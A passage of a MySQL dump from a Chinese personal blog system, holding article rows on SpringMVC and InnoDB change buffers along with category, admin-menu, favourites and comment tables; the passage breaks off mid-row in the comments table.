渲染视图之后\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        System.out.println(\"我是拦截器的最后处理方法...\");\n    }\n}\n</pre><p><br></p>',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDYD6AOJNUAAB2ogoi2js91.jpeg',2,0,'220226DP09K1F0SW','目录目录SpringMVCSpringMVC环境搭建pom.xmlweb.xmlresource目录下配置springmvc.xml文件配置视图解析器DispatcherServlet前端控制器HandlerMapping处理器映射器Handler处理器HandlerAdapter处理器适配器ViewResolver视图解析器RequestMapping的属性请求参数绑定获取原生API的方式注解R',0,0,0,NULL,0,0,'2022-05-17 16:44:00','2022-05-17 16:44:00','[\"220329D4RM2MM4PH\",\"220329D180W7F2RP\"]',NULL),('220517BZ62R6ZRS8','普通索引和唯一索引，应该怎么选择？','<p>nnoDB 的数据是按数据页为单位来读写的; 也就是说, 当需要读一条记录的时候, 并不是将这个记录本身从磁盘读出来, 而是以页为单位, 将其整体读入内存; 在 InnoDB 中, 每个数据页的大小默认是 16KB</p><h2>change buffer</h2><p>当需要更新一个数据页时, 如果数据页在内存中就直接更新, 而如果这个数据页还没有在内存中的话, 在不影响数据一致性的前提下, InnoDB 会将这些更新操作缓存在 change buffer 中, 这样就不需要从磁盘中读入这个数据页了; 在下次查询需要访问这个数据页的时候, 将数据页读入内存, 然后执行 change buffer 中与这个页有关的操作</p><p>change buffer, 实际上它是可以持久化的数据; 也就是说, change buffer 在内存中有拷贝, 也会被写入到磁盘上</p><p>将 change buffer 中的操作应用到原数据页, 得到最新结果的过程称为 merge; 除了访问这个数据页会触发 merge 外, 系统有后台线程会定期 merge; 在数据库正常关闭(shutdown)的过程中, 也会执行 merge 操作</p><p>好处: 如果能够将更新操作先记录在 change buffer, 减少读磁盘, 语句的执行速度会得到明显的提升; 而且, 数据读入内存是需要占用 buffer pool 的, 所以这种方式还能够避免占用内存, 提高内存利用率</p><h3>什么条件下可以使用 change buffer?</h3><p>对于唯一索引来说, 所有的更新操作都要先判断这个操作是否违反唯一性约束, 当插入一条记录时, 就要先判断现在表中是否已经存在该记录, 而这必须要将数据页读入内存才能判断; 如果都已经读入到内存了, 那直接更新内存会更快, 就没必要使用 change buffer 了; 因此, 唯一索引的更新就不能使用 change buffer, 实际上也只有普通索引可以使用</p><p>change buffer 用的是 buffer pool 里的内存, 因此不能无限增大; change buffer 的大小, 可以通过参数 innodb_change_buffer_max_size 来动态设置; 这个参数设置为 50 的时候, 表示 change buffer 的大小最多只能占用 buffer pool 的 50%</p><p>当向表中插入一条记录时: </p><p>这个记录要更新的目标页在内存中</p><ul><li>对于唯一索引来说, 找到 3 和 5 之间的位置, 判断到没有冲突, 插入这个值, 语句执行结束</li><li>对于唯一索引来说, 找到 3 和 5 之间的位置, 判断到没有冲突, 插入这个值, 语句执行结束</li></ul><p>这个记录要更新的目标页不在内存中</p><ul><li>对于唯一索引来说, 需要将数据页读入内存, 判断到没有冲突, 插入这个值, 语句执行结束</li><li>对于普通索引来说, 则是将更新记录在 change buffer, 语句执行就结束了</li></ul><p>将数据从磁盘读入内存涉及随机 IO 的访问, 是数据库里面成本最高的操作之一; change buffer 因为减少了随机磁盘访问, 所以对更新性能的提升是会很明显的</p><h3>change buffer 的使用场景</h3><p> merge 的时候是真正进行数据更新的时刻, 而 change buffer 的主要目的就是将记录的变更动作缓存下来, 所以在一个数据页做 merge 之前, change buffer 记录的变更越多(也就是这个页面上要更新的次数越多), 收益就越大</p><p>对于写多读少的业务来说, 页面在写完以后马上被访问到的概率比较小, 此时 change buffer 的使用效果最好; 这种业务模型常见的就是账单类、日志类的系统</p><p>假设一个业务的更新模式是写入之后马上会做查询, 那么即使满足了条件, 将更新先记录在 change buffer, 但之后由于马上要访问这个数据页, 会立即触发 merge 过程; 这样随机访问 IO 的次数不会减少, 反而增加了 change buffer 的维护代价; 所以, 对于这种业务模式来说, change buffer 反而起到了副作用</p><p>这两类索引在查询能力上是没差别的, 主要考虑的是对更新性能的影响; 所以, 尽量选择普通索引</p><p>如果所有的更新后面, 都马上伴随着对这个记录的查询, 那么你应该关闭 change buffer; 而在其他情况下, change buffer 都能提升更新性能</p><h2>change buffer 和 redo log</h2><p>redo log 主要节省的是随机写磁盘的 IO 消耗(转成顺序写), 而 change buffer 主要节省的则是随机读磁盘的 IO 消耗</p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDYNmAUwD2AAFUhW-lnPo186.jpg',2,0,'220226DP09K1F0SW','nnoDB的数据是按数据页为单位来读写的;也就是说,当需要读一条记录的时候,并不是将这个记录本身从磁盘读出来,而是以页为单位,将其整体读入内存;在InnoDB中,每个数据页的大小默认是16KBchangebuffer当需要更新一个数据页时,如果数据页在内存中就直接更新,而如果这个数据页还没有在内存中的话,在不影响数据一致性的前提下,InnoDB会将这些更新操作缓存在changebuffer中,这样',0,0,0,NULL,0,0,'2022-05-17 16:46:29','2022-05-17 16:46:29','[\"220329D4W4C5AH4H\"]',NULL);
/*!40000 ALTER TABLE `t_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_category`
--

DROP TABLE IF EXISTS `t_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_category` (
  `id` varchar(32) NOT NULL,
  `name` varchar(12) NOT NULL,
  `description` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `create_time` timestamp NOT NULL,
  `update_time` timestamp NOT NULL,
  `status` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_category`
--

LOCK TABLES `t_category` WRITE;
/*!40000 ALTER TABLE `t_category` DISABLE KEYS */;
INSERT INTO `t_category` VALUES ('10','JVM','JVM','2022-03-25 06:58:21','2022-03-31 06:23:27',1),('11','读书心得','读书心得','2022-03-30 14:05:52','2022-03-30 14:06:05',1),('12','摄影','摄影呀','2022-03-30 14:05:54','2022-03-31 23:16:43',1),('2','技术新闻','技术新闻','2022-03-25 06:58:02','2022-04-10 21:34:08',1),('3','机器学习','机器学习','2022-03-25 06:58:05','2022-04-10 21:24:37',1),('5','后端开发','后端开发','2022-03-25 06:58:08','2022-04-23 08:15:21',1),('6','前端开发','前端开发','2022-03-25 06:58:11','2022-03-30 14:06:03',1),('7','学习笔记','学习笔记','2022-03-25 06:58:16','2022-03-30 14:06:04',1),('9','面试','面试','2022-03-25 06:58:18','2022-04-01 06:51:14',1);
/*!40000 ALTER TABLE `t_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_category_menu`
--

DROP TABLE IF EXISTS `t_category_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_category_menu` (
  `id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '唯一uid',
  `name` varchar(255) NOT NULL COMMENT '菜单名称',
  `menu_level` tinyint(1) DEFAULT NULL COMMENT '菜单级别',
  `summary` varchar(200) DEFAULT NULL COMMENT '简介',
  `parent_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL COMMENT '父uid',
  `url` varchar(255) DEFAULT NULL COMMENT 'url地址',
  `icon` varchar(50) DEFAULT NULL COMMENT '图标',
  `sort` int DEFAULT '0' COMMENT '排序字段，越大越靠前',
  `status` tinyint unsigned NOT NULL DEFAULT '1' COMMENT '状态',
  `create_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '创建时间',
  `update_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '更新时间',
  `is_show` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否显示 1:是 0:否',
  `menu_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '菜单类型 0: 菜单   1: 按钮',
  `is_jump_external_url` tinyint(1) DEFAULT '0' COMMENT '是否跳转外部链接 0：否，1：是',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_category_menu`
--

LOCK TABLES `t_category_menu` WRITE;
/*!40000 ALTER TABLE `t_category_menu` DISABLE KEYS */;
INSERT INTO `t_category_menu` VALUES ('0a035547bbec404eb3ee0ef43312148d','类别管理',2,'博客类别管理','49b42250abcb47ff876bad699cf34f03','/blog/category','el-icon-folder-opened',10,1,'2022-03-28 10:33:22','2022-03-28 10:33:28',1,0,0),('147cd431cbb9007bde87444d7987b151','监控中心',1,'监控中心',NULL,'/monitor','el-icon-monitor',0,1,'2020-01-06 05:25:32','2020-07-09 13:33:11',1,0,0),('152216a4fd9b995aa20bfa1eec6312c2','Nacos',2,'Nacos图形化界面','147cd431cbb9007bde87444d7987b151','http://106.12.136.221:8848/nacos','el-icon-star-off',5,1,'2020-07-03 13:39:58','2020-12-05 07:31:11',1,0,1),('1f01cd1d2f474743b241d74008b12333','文章管理',2,'文章管理','49b42250abcb47ff876bad699cf34f03','/blog/article','el-icon-notebook-2',11,1,'2022-03-25 10:30:52','2022-03-28 10:30:58',1,0,0),('238352fc7e86340c339b9a575b1b7086','Sentinel',2,'Sentinel监控中心','147cd431cbb9007bde87444d7987b151','http://localhost:8070/sentinel/','el-icon-warning-outline',4,1,'2020-07-06 13:25:52','2020-12-05 07:31:27',1,0,1),('2fb47d3b6dbd44279c8206740a263543','网站配置',2,'网站配置','badf0010422b432ba6ec9c83a25012ed','/system/webConfig','el-icon-s-data',1,1,'2018-11-28 11:59:04','2020-08-30 00:01:11',1,0,0),('49b42250abcb47ff876bad699cf34f03','博客管理',1,'用于博客的一些相关操作',NULL,'/blog','el-icon-edit',20,1,'2018-11-24 21:15:07','2020-10-07 07:35:48',1,0,0),('510483ce569b4fc88299f346147b1314','资源管理',1,'资源管理','','/resource','el-icon-present',2,1,'2018-11-28 11:42:13','2020-05-30 00:51:30',1,0,0),('6606b7e646d545e5a25c70b5e5fade9f','标签管理',2,'对博客标签进行管理','49b42250abcb47ff876bad699cf34f03','/blog/tag','el-icon-collection-tag',4,1,'2018-11-25 18:57:38','2020-05-30 00:34:43',1,0,0),('78f24799307cb63bc3759413dadf4d1a','系统配置',2,'设置七牛云和邮箱等相关配置','badf0010422b432ba6ec9c83a25012ed','/system/systemConfig','el-icon-s-tools',2,1,'2020-01-21 01:29:04','2020-08-30 00:01:17',1,0,0),('879cfcd4dfd3e5bc1bb6ea2c0f1f82c0','文章接口',2,'文章接口','baace3dc03d34c54b81761dce8243814','/restapi/article','el-icon-connection',0,1,'2020-03-21 09:39:12','2021-01-08 14:04:14',1,0,0),('9002d1ae905c4cb79c2a485333dad2f7','友情链接',2,'友情链接','badf0010422b432ba6ec9c83a25012ed','/system/fl','el-icon-ship',0,1,'2018-11-28 19:56:35','2020-05-30 00:36:01',1,0,0),('93f7fd9a6e81735c47649e6b36042b5d','数据监控',2,'数据监控','147cd431cbb9007bde87444d7987b151','/monitor/druid','el-icon-cloudy-and-sunny',1,1,'2020-01-06 05:26:51','2020-12-05 07:31:47',1,0,0),('9449ce5dd5e24b21a9d15f806cb36e87','资源分类',2,'资源分类','510483ce569b4fc88299f346147b1314','/resource/resourceSort','el-icon-position',0,1,'2018-11-28 19:43:27','2020-05-30 00:51:58',1,0,0),('9beb7caa2c844b36a02789262dc76fbe','评论管理',2,'评论管理','bcf4a9bc21c14b559bcb015fb7912266','/message/comment','el-icon-chat-line-square',1,1,'2018-11-28 11:47:23','2020-05-30 00:48:28',1,0,0),('a0c40ddd3fe15bb3f2edf9ec242a1511','服务器监控',2,'服务器监控','147cd431cbb9007bde87444d7987b151','/monitor/server','el-icon-lightning',7,1,'2020-06-03 01:26:13','2020-12-05 07:27:45',1,0,0),('a9396f1a3fbdec3d4cb614f388a22bea','缓存监控',2,'redis监控','147cd431cbb9007bde87444d7987b151','/monitor/cache','el-icon-sunrise\n',5,1,'2020-01-05 13:30:16','2020-12-05 07:30:27',1,0,0),('baace3dc03d34c54b81761dce8243814','接口管理',1,'接口管理','','/restapi','el-icon-stopwatch',4,1,'2018-11-28 12:01:57','2020-05-30 00:49:22',1,0,0),('badf0010422b432ba6ec9c83a25012ed','系统管理',1,'系统管理','','/system','el-icon-setting',19,1,'2018-11-28 11:54:47','2020-10-07 07:35:52',1,0,0),('bcf4a9bc21c14b559bcb015fb7912266','消息管理',1,'消息管理','','/message','el-icon-message',6,1,'2018-11-28 11:45:29','2020-05-30 00:48:21',1,0,0),('bfc9463e59a3ca250dcfc1c86627e034','ElasticSearch',2,'ElasticSearch监控页面','147cd431cbb9007bde87444d7987b151','/monitor/elasticsearch','el-icon-cloudy',0,1,'2020-01-15 14:58:00','2020-12-09 12:41:11',1,0,0),('c519725da92b42f3acf0cc9fad58c664','用户管理',1,'用户管理','','/user','el-icon-user',15,1,'2018-11-28 11:51:47','2020-05-30 00:46:44',1,0,0),('cbd7ba11c1b38c66b569405ed9185f35','RabbitMQ',2,'RabbitMQ监控中心','147cd431cbb9007bde87444d7987b151','http://119.29.35.129:15672/#/','el-icon-sunny',3,1,'2020-01-05 13:29:39','2020-12-05 07:31:33',1,0,1),('d4d92c53d3614d00865e9219b8292a90','图片接口',2,'图片接口','baace3dc03d34c54b81761dce8243814','/restapi/picture','el-icon-heavy-rain',0,1,'2018-11-28 12:04:33','2020-12-24 01:20:21',1,0,0),('e1e54aea65cc22d9f8a4c74ce8d23749','网盘管理',2,'管理网盘的资源','510483ce569b4fc88299f346147b1314','/resource/file','el-icon-unlock',1,1,'2020-06-13 08:36:11','2020-10-10 06:38:13',1,0,0),('e4a482c089d04a30b6ecbaadb81b70f8','管理员接口',2,'管理员接口','baace3dc03d34c54b81761dce8243814','/restapi/admin','el-icon-moon-night',0,1,'2018-11-28 12:03:32','2020-12-24 01:20:17',1,0,0),('f9276eb8e3274c8aa05577c86e4dc8c1','用户接口',2,'用户接口','baace3dc03d34c54b81761dce8243814','/restapi/user','el-icon-light-rain',0,1,'2018-11-28 12:04:52','2020-12-05 07:46:54',1,0,0),('fb4237a353d0418ab42c748b7c1d64c6','用户管理',2,'用户管理','c519725da92b42f3acf0cc9fad58c664','/user/user','el-icon-user-solid',3,1,'2018-11-28 11:52:20','2020-05-30 00:46:54',1,0,0);
/*!40000 ALTER TABLE `t_category_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_collect`
--

DROP TABLE IF EXISTS `t_collect`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_collect` (
  `id` varchar(32) DEFAULT NULL,
  `name` varchar(12) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT NULL,
  `update_time` timestamp NULL DEFAULT NULL,
  `user_id` varchar(32) DEFAULT NULL,
  `articles` text,
  `open` int DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_collect`
--

LOCK TABLES `t_collect` WRITE;
/*!40000 ALTER TABLE `t_collect` DISABLE KEYS */;
INSERT INTO `t_collect` VALUES ('2007108YW09A83XP54534512','默认收藏夹','这是一个默认的收藏夹 在创建用户时创建的。默认是公开的','2022-04-16 05:59:33','2022-05-16 11:19:12','220226DP09K1F0SW','[\"220414DPDB6DTT2W\",\"220414DPDB6DTT2W\",\"220414DPDB6DTT2W\",\"220414DPDB6DTT2W\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CS5RY4HM80\",\"220403CSY0BRPBR4\",\"220403CS5RY4HM80\",\"220403CSY0BRPBR4\",\"220403CT2P7T6RP0\",\"220403CPZ5ZB5BTC\",\"220424A5S09T3WPH\",\"220424A85AYWB06W\",\"220424A62W7DF9YW\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CRCRB6P0ZC\",\"220403CSY0BRPBR4\",\"220424A62W7DF9YW\",\"220403CTCXKXNP4H\",\"220424A5S09T3WPH\",\"220403CS5RY4HM80\",\"220424A6RG0CY4PH\",\"220403CSY0BRPBR4\",\"220424A4ABRTCTF8\",\"220414DPDB6DTT2W\",\"220403CPZ5ZB5BTC\",\"220424A55D2YRZTC\",\"220424A7NM5WNA14\",\"220424A8P039F614\",\"220403CT2P7T6RP0\",\"220403CRCRB6P0ZC\",\"220517BY1PM0TZ9P\",\"220517BYAS47G0X4\",\"220517BWRZ2S8ZC0\"]',0),('220417A7BGZG7ZMW','22','22','2022-04-16 22:22:58','2022-04-16 22:22:58','220417A4MW3HZ5D4','',1),('2204209XMYPAKK1P','默认收藏夹','','2022-04-19 21:53:44','2022-04-19 21:53:44','2204209XM07KK86W','[\"\"]',1),('2204219X3H5K0RWH','默认收藏夹','','2022-04-20 21:52:05','2022-04-20 21:52:05','2204219X3CAZHYCH','',1),('2204238FN06SP4X4','默认收藏夹','','2022-04-22 19:56:38','2022-04-22 19:57:43','2204238FMYWGAM3C','',1),('22042391HX0CBK68','默认收藏夹','','2022-04-22 20:41:27','2022-04-22 20:41:27','22042391HRCRD58H','',1),('2204239RRTNTXC4H','默认收藏夹','','2022-04-22 21:42:02','2022-04-22 21:42:02','2204239RRPTMWACH','',1),('2204239WA1P3Z5S8','默认收藏夹','','2022-04-22 21:49:46','2022-04-22 21:49:46','2204239WA0BHB44H','',1),('2204239YWHHR0WDP','默认收藏夹','','2022-04-22 21:57:20','2022-04-22 21:57:20','2204239YWGA0KSY8','',1),('2204239ZM52KSD68','默认收藏夹','','2022-04-22 21:59:39','2022-04-22 21:59:39','2204239ZM51RXPM8','',1),('220423A4604Y9HBC','默认收藏夹','','2022-04-22 22:13:21','2022-04-22 22:13:21','220423A46036H37C','',1),('220423ANGN21BTC0','默认收藏夹','','2022-04-22 22:59:26','2022-04-22 22:59:26','220423ANGKXB0TTC','',1),('220423B5PK4G8BC0','默认收藏夹','','2022-04-22 23:42:00','2022-04-22 23:42:00','220423B5PF8K2BHH','',1),('220423B6S60K50PH','默认收藏夹','','2022-04-22 23:45:10','2022-04-22 23:45:10','220423B6S51GPH94','',1),('22042490HZR2K58H','默认收藏夹','','2022-04-23 20:38:27','2022-04-23 20:38:27','22042490HY8KW1KP','',1),('220424A256PCM98H','后端开发','这是关于后端开发的收藏夹','2022-04-23 22:07:16','2022-05-11 09:09:48','220226DP09K1F0SW','[\"\",\"220403CT2P7T6RP0\",\"220403CSAF3Z1N9P\",\"220403CPZ5ZB5BTC\",\"220424A5S09T3WPH\",\"220424A62W7DF9YW\",\"220403CSY0BRPBR4\",\"220403CSY0BRPBR4\",\"220403CTCXKXNP4H\",\"220424A5S09T3WPH\",\"220403CS5RY4HM80\",\"220424A6RG0CY4PH\",\"220403CSY0BRPBR4\",\"220403CSAF3Z1N9P\",\"220424A62W7DF9YW\",\"220424A4ABRTCTF8\",\"220414DPDB6DTT2W\",\"220403CPZ5ZB5BTC\",\"220424A55D2YRZTC\",\"220424A7NM5WNA14\",\"220424A8P039F614\",\"220403CT2P7T6RP0\",\"220403CRCRB6P0ZC\",\"220517BY1PM0TZ9P\",\"220517BYAS47G0X4\",\"220517BWRZ2S8ZC0\"]',1),('220427F60Z2A6WM8','默认收藏夹','','2022-04-27 03:55:06','2022-04-27 03:55:06','220427F60Z143G7C','',1),('220502DSA42PS70H','默认收藏夹','这是一个默认的收藏夹 在创建用户时创建的。默认是公开的','2022-05-02 03:20:03','2022-05-02 03:20:03','220502DSA2CC7F80','',1),('2205088H53A88RGC','默认收藏夹','这是一个默认的收藏夹 在创建用户时创建的。默认是公开的','2022-05-07 20:01:09','2022-05-13 07:07:26','2205088H55FW0Y3C','',1),('2205088MN52BR1AW','默认收藏夹','这是一个默认的收藏夹 在创建用户时创建的。默认是公开的','2022-05-08 04:08:40','2022-05-08 04:08:40','2205088MN2A3X1P0','',1),('2205088N759KDD40','默认收藏夹','这是一个默认的收藏夹 在创建用户时创建的。默认是公开的','2022-05-07 20:10:23','2022-05-07 20:10:23','2205088N7A8RWR68','',1),('220513DC05HTZFY8','学习笔记','学习笔记','2022-05-13 10:48:58','2022-05-14 04:04:53','220226DP09K1F0SW','[\"\",\"220403CT2P7T6RP0\",\"220403CRCRB6P0ZC\",\"220517BY1PM0TZ9P\",\"220517BYAS47G0X4\",\"220517BWRZ2S8ZC0\"]',1);
/*!40000 ALTER TABLE `t_collect` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_comment`
--

DROP TABLE IF EXISTS `t_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_comment` (
  `id` varchar(24) NOT NULL,
  `author` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `father_id` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `article_id` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `article_title` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `article_cover` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `comment_user_id` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `comment_user_nickname` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `comment_user_face` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `content` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `create_time` datetime NOT NULL,
  `likes` int DEFAULT '0',
  `img_src` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_comment`
--

LOCK TABLES `t_comment` WRITE;
/*!40000 ALTER TABLE `t_comment` DISABLE KEYS */;
INSERT INTO `t_comment` VALUES ('220509DDF5W13FY8','220226DP09K1F0SW','0','220403CSY0BRPBR4','FastDFS','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJb4OAHSnVAAAQ6GF1LMQ991.png','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😏😏😏😏','2022-05-09 18:53:28',NULL,NULL),('220509DDG5YA5AW0','220226DP09K1F0SW','0','220403CSY0BRPBR4','FastDFS','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJb4OAHSnVAAAQ6GF1LMQ991.png','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','👻👻👻','2022-05-09 18:53:34',NULL,NULL),('220509DDPGCX6SA8','220226DP09K1F0SW','0','220403CSAF3Z1N9P','Spring 编程思想','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbxuAfAUCAAAnD7zPwxo35.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😃','2022-05-09 18:54:09',NULL,NULL),('220509DDRD58D0BC','220226DP09K1F0SW','0','220403CSAF3Z1N9P','Spring 编程思想','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbxuAfAUCAAAnD7zPwxo35.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','123','2022-05-09 18:54:15',NULL,NULL),('220509DDWP0KWSFW','220226DP09K1F0SW','0','220424A62W7DF9YW','docker 基本使用','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk68qADeZoAAAnEkmew0o17.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','899','2022-05-09 18:54:36',NULL,NULL),('220509DDZTNWDTXP','220226DP09K1F0SW','0','220424A4ABRTCTF8','ElasticSearch','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk6meAE3lqAAB5_h6wuRs46.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','777','2022-05-09 18:54:56',NULL,NULL),('220509DF4AMDAAY8','220226DP09K1F0SW','0','220414DPDB6DTT2W','Astronomia (MaxRiven Mix)','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJYAbeAOxoKAAGQwJ6Bxls196.JPG','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','777','2022-05-09 18:55:25',NULL,NULL),('220509DF5YP0484H','220226DP09K1F0SW','','220414DPDB6DTT2W','Astronomia (MaxRiven Mix)','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJYAbeAOxoKAAGQwJ6Bxls196.JPG','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','666','2022-05-09 18:55:35',NULL,NULL),('2205108C5CT2T1WH','220226DP09K1F0SW','0','220403CPZ5ZB5BTC','安装zsh','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbgiABTTkAAD1adl-4Ns31.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','111😘😘😘','2022-05-10 11:49:11',NULL,NULL),('2205108C67ABY7MW','220226DP09K1F0SW','0','220403CPZ5ZB5BTC','安装zsh','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbgiABTTkAAD1adl-4Ns31.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😁😁','2022-05-10 11:49:16',NULL,NULL),('220511C7S911YP28','220226DP09K1F0SW','0','220403CS5RY4HM80','Deep understanding of the Java','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbuuATylCAAAqxRWziDM15.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😘😘😘','2022-05-11 17:12:15',NULL,NULL),('220511C7T1NKNXAW','220226DP09K1F0SW','0','220403CS5RY4HM80','Deep understanding of the Java','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbuuATylCAAAqxRWziDM15.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','000','2022-05-11 17:12:20',NULL,NULL),('220511C7X4D0R3MW','220226DP09K1F0SW','0','220403CS5RY4HM80','Deep understanding of the Java','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbuuATylCAAAqxRWziDM15.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','999','2022-05-11 17:12:33',NULL,NULL),('220512ARFNX1SZHH','220226DP09K1F0SW','0','220403CSAF3Z1N9P','Spring 编程思想','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbxuAfAUCAAAnD7zPwxo35.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','888','2022-05-12 15:05:20',NULL,NULL),('220512ARHDZ6N828','220226DP09K1F0SW','0','220403CSAF3Z1N9P','Spring 编程思想','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbxuAfAUCAAAnD7zPwxo35.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','😍😍','2022-05-12 15:05:31',NULL,NULL),('220513DBG37574SW','220226DP09K1F0SW','0','220424A55D2YRZTC','Git 的基本使用','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk6yaAAE0QAAFZz1MkotY65.jpeg','220226DP09K1F0SW','快乐就像','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJ3Q2WAUsuaAAA2zJ3Z3S072.jpeg','66','2022-05-13 18:47:34',NULL,NULL),('220513DBGNHPZGXP','220226DP09K1F0SW','0','220424A55D2YRZTC','Git 